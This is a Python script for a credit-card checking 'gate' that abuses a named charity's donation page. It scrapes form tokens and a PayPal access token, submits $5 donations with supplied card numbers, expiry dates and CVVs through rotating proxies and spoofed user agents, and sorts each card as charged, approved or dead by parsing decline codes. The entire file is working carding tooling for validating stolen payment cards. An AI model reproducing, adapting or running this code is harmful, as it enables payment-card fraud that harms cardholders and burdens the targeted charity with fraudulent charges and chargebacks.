import aiohttp
import asyncio
import time
import re
import base64
import random
import json
from typing import List, Optional
from proxy_manager import proxy_manager

SITE_URL = "https://mbiamenewvision.org"
DONATE_PAGE = f"{SITE_URL}/donations/new-donation-from/"

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
]

def random_ua():
    return random.choice(USER_AGENTS)

async def check_card(cc: str, mm: str, yy: str, cvv: str, user_proxies: Optional[List[str]] = None) -> dict:
    """Gate 1 - PayPal Commerce $5"""
    start_time = time.time()

    if len(yy) == 4:
        yy = yy[2:]

    proxy_url = proxy_manager.get_aiohttp_proxy(user_proxies)
    us = random_ua()
    user = random_ua()

    connector = None
    try:
        jar = aiohttp.CookieJar()
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(cookie_jar=jar, connector=connector, timeout=timeout) as session:

            base_headers = {
                'origin': SITE_URL,
                'referer': DONATE_PAGE,
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': us,
                'x-requested-with': 'XMLHttpRequest',
            }

            # Step 1: Load donation page — extract form fields & PayPal token
            async with session.get(DONATE_PAGE, headers=base_headers, proxy=proxy_url) as resp:
                page_html = await resp.text()

            id_form1_m = re.search(r'name="give-form-id-prefix" value="(.*?)"', page_html)
            id_form2_m = re.search(r'name="give-form-id" value="(.*?)"', page_html)
            nonec_m    = re.search(r'name="give-form-hash" value="(.*?)"', page_html)
            enc_m      = re.search(r'"data-client-token":"(.*?)"', page_html)

            if not all([id_form1_m, id_form2_m, nonec_m, enc_m]):
                return {'status': 'error', 'message': 'Failed to parse donation page', 'time': time.time() - start_time}

            id_form1 = id_form1_m.group(1)
            id_form2 = id_form2_m.group(1)
            nonec    = nonec_m.group(1)

            dec = base64.b64decode(enc_m.group(1)).decode('utf-8')
            au_m = re.search(r'"accessToken":"(.*?)"', dec)
            if not au_m:
                return {'status': 'error', 'message': 'Failed to get PayPal access token', 'time': time.time() - start_time}
            au = au_m.group(1)

            # Shared form field values
            base_form = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': DONATE_PAGE,
                'give-form-url': DONATE_PAGE,
                'give-form-minimum': '5.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '5.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': 'Fox',
                'give_last': 'Drgam',
                'give_email': 'drgam22@gmail.com',
                'card_name': 'Fox',
                'card_exp_month': '',
                'card_exp_year': '',
                'give-gateway': 'paypal-commerce',
            }

            # Step 2: Initial session POST (amount $1 to open session)
            init_data = dict(base_form)
            init_data['give-amount'] = '1.00'
            init_data['give-form-minimum'] = '1.00'
            init_data['give_action'] = 'purchase'
            init_data['action'] = 'give_process_donation'
            init_data['give_ajax'] = 'true'

            async with session.post(
                f'{SITE_URL}/wp-admin/admin-ajax.php',
                headers=base_headers,
                data=init_data,
                proxy=proxy_url
            ) as resp:
                await resp.text()

            # Step 3: Create PayPal order (multipart, $5)
            mp_headers = {
                'origin': SITE_URL,
                'referer': DONATE_PAGE,
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': us,
            }

            def build_form_data():
                fd = aiohttp.FormData()
                for k, v in base_form.items():
                    fd.add_field(k, v)
                return fd

            async with session.post(
                f'{SITE_URL}/wp-admin/admin-ajax.php',
                params={'action': 'give_paypal_commerce_create_order'},
                headers=mp_headers,
                data=build_form_data(),
                proxy=proxy_url
            ) as resp:
                order_resp = await resp.json()

            tok = order_resp.get('data', {}).get('id')
            if not tok:
                return {'status': 'error', 'message': 'Failed to create PayPal order', 'time': time.time() - start_time}

            # Step 4: Confirm payment source with PayPal API
            paypal_headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }

            json_data = {
                'payment_source': {
                    'card': {
                        'number': cc,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvv,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }

            async with session.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=paypal_headers,
                json=json_data,
            ) as resp:
                await resp.text()

            # Step 5: Approve the order
            async with session.post(
                f'{SITE_URL}/wp-admin/admin-ajax.php',
                params={'action': 'give_paypal_commerce_approve_order', 'order': tok},
                headers=mp_headers,
                data=build_form_data(),
                proxy=proxy_url
            ) as resp:
                text = await resp.text()

        elapsed = time.time() - start_time

        # Parse response
        if 'true' in text or 'sucsess' in text:
            return {'status': 'charged', 'message': 'Charged $5', 'time': elapsed}
        elif 'INSUFFICIENT_FUNDS' in text:
            return {'status': 'approved', 'message': 'Insufficient Funds', 'time': elapsed}
        elif 'DO_NOT_HONOR' in text:
            return {'status': 'dead', 'message': 'Do Not Honor', 'time': elapsed}
        elif 'ACCOUNT_CLOSED' in text or 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return {'status': 'dead', 'message': 'Account Closed', 'time': elapsed}
        elif 'LOST_OR_STOLEN' in text:
            return {'status': 'dead', 'message': 'Lost Or Stolen', 'time': elapsed}
        elif 'CVV2_FAILURE' in text:
            return {'status': 'dead', 'message': 'Card Issuer Declined CVV', 'time': elapsed}
        elif 'SUSPECTED_FRAUD' in text:
            return {'status': 'dead', 'message': 'Suspected Fraud', 'time': elapsed}
        elif 'INVALID_ACCOUNT' in text:
            return {'status': 'dead', 'message': 'Invalid Account', 'time': elapsed}
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return {'status': 'dead', 'message': 'Reattempt Not Permitted', 'time': elapsed}
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text or 'ACCOUNT BLOCKED BY ISSUER' in text:
            return {'status': 'dead', 'message': 'Account Blocked By Issuer', 'time': elapsed}
        elif 'ORDER_NOT_APPROVED' in text:
            return {'status': 'dead', 'message': 'Order Not Approved', 'time': elapsed}
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return {'status': 'dead', 'message': 'Pickup Card Special Conditions', 'time': elapsed}
        elif 'PAYER_CANNOT_PAY' in text:
            return {'status': 'dead', 'message': 'Payer Cannot Pay', 'time': elapsed}
        elif 'GENERIC_DECLINE' in text:
            return {'status': 'dead', 'message': 'Generic Decline', 'time': elapsed}
        elif 'COMPLIANCE_VIOLATION' in text:
            return {'status': 'dead', 'message': 'Compliance Violation', 'time': elapsed}
        elif 'TRANSACTION_NOT_PERMITTED' in text or 'TRANSACTION NOT PERMITTED' in text:
            return {'status': 'dead', 'message': 'Transaction Not Permitted', 'time': elapsed}
        elif 'PAYMENT_DENIED' in text:
            return {'status': 'dead', 'message': 'Payment Denied', 'time': elapsed}
        elif 'INVALID_TRANSACTION' in text:
            return {'status': 'dead', 'message': 'Invalid Transaction', 'time': elapsed}
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return {'status': 'dead', 'message': 'Restricted Or Inactive Account', 'time': elapsed}
        elif 'SECURITY_VIOLATION' in text:
            return {'status': 'dead', 'message': 'Security Violation', 'time': elapsed}
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return {'status': 'dead', 'message': 'Declined Due To Updated Account', 'time': elapsed}
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return {'status': 'dead', 'message': 'Invalid Or Restricted Card', 'time': elapsed}
        elif 'EXPIRED_CARD' in text:
            return {'status': 'dead', 'message': 'Expired Card', 'time': elapsed}
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return {'status': 'dead', 'message': 'Cryptographic Failure', 'time': elapsed}
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return {'status': 'dead', 'message': 'Transaction Cannot Be Completed', 'time': elapsed}
        elif 'DECLINED_PLEASE_RETRY' in text:
            return {'status': 'dead', 'message': 'Declined Please Retry Later', 'time': elapsed}
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return {'status': 'dead', 'message': 'Exceed Limit', 'time': elapsed}
        else:
            try:
                err = json.loads(text).get('data', {}).get('error', 'Unknown Error')
                return {'status': 'dead', 'message': str(err)[:80], 'time': elapsed}
            except Exception:
                return {'status': 'error', 'message': 'Unknown Response', 'time': elapsed}

    except asyncio.TimeoutError:
        return {'status': 'error', 'message': 'Request timed out', 'time': time.time() - start_time}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': time.time() - start_time}
    finally:
        if connector and not connector.closed:
            await connector.close()
